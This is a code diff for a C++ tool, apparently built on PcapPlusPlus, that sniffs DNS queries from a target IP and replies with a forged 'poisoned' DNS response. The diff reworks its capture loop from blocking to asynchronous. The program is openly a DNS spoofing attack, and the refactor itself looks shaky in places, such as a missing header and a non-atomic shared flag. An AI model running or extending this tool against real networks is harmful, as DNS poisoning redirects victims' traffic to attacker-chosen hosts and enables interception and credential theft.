@@ -7,10 +7,13 @@
 
 #include <chrono>
 #include <thread>
+#include <mutex>
 
 #include "Screen.h"
 
 Arguments Program::args {};
+bool Program::isCapturing = false;
+std::condition_variable Program::capturingEnded;
 
 Program::Program(const std::string& name, int argc, char* argv[])
     : 
@@ -24,10 +27,21 @@ Program::Program(const std::string& name, int argc, char* argv[])
 void Program::Run()
 {
     std::cout << "Waiting for DNS packets to come..." << std::endl;
-    dev->startCaptureBlockingMode(Program::OnPacketCapture, nullptr, 60);
+    if(dev->startCapture(Program::OnPacketCapture, nullptr))
+    {
+        isCapturing = true;
+        std::unique_lock<std::mutex> lckg(mtx);
+        capturingEnded.wait(lckg, [this]{return !isCapturing;});
+    }
+
+    if (!isCapturing)
+    {
+        dev->stopCapture();
+        dev->close();
+    }
 }
 
-bool Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
+void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev, void* cookie)
 {
     pcpp::Packet parsedPacket(packet);
 
@@ -37,7 +51,7 @@ bool Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
     
     if(ipLayer->getSrcIPv4Address() != args.targetIP)
-        return false; // keep capturing
+        return;
 
     // Constructing the poisoned response
     uint16_t originalID = dnsLayer->getDnsHeader()->transactionID;
@@ -79,12 +93,16 @@ bool Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     if (!dev->sendPacket(&poisonedPacket))
     {
         std::cerr << "Failed to send poisoned packet." << std::endl;
-        return false; // continue capture
+        isCapturing = false;
+        capturingEnded.notify_all();
+        return;
 
     }
 
     std::cout << "Poisoning successful." << std::endl;
-    return true; // stop capture
+    isCapturing = false;
+    capturingEnded.notify_all();
+    return;
 }
 
 void Program::ParseArguments(int argc, char* argv[])
